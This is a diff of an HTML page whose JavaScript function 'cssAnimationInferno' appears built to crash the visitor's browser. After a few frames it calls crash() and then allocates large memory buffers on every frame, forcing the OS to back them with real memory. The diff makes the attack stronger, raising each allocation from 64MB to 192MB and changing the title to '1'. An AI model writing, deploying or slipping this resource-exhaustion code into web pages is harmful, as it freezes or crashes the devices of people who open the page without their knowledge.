@@ -165,7 +165,7 @@
 <body>
 
     <div class="header-section">
-        <h1>Title</h1>
+        <h1>1</h1>
     </div>
 
     <div class="slider-container">
@@ -266,15 +266,14 @@ function cssAnimationInferno() {
             frameCount++;
 
             // Trigger WebGL precisely on the 3rd frame
-            if (frameCount >= 3 && !webglTriggered) {
+            if (frameCount >= 5 && !webglTriggered) {
                 webglTriggered = true;
                 crash(); 
             }
 
             // Rapid RAM allocation vector (64MB per frame) once WebGL starts running
             if (webglTriggered) {
-                // 1 Megabyte = 1024 * 1024 bytes. 64 Megabytes = 67,108,864 bytes.
-                const buffer = new ArrayBuffer(64 * 1024 * 1024);
+                const buffer = new ArrayBuffer(192 * 1024 * 1024);
                 // Fill buffer partially to force physical allocation backed by OS memory pages
                 const view = new Uint8Array(buffer);
                 view[0] = 1;
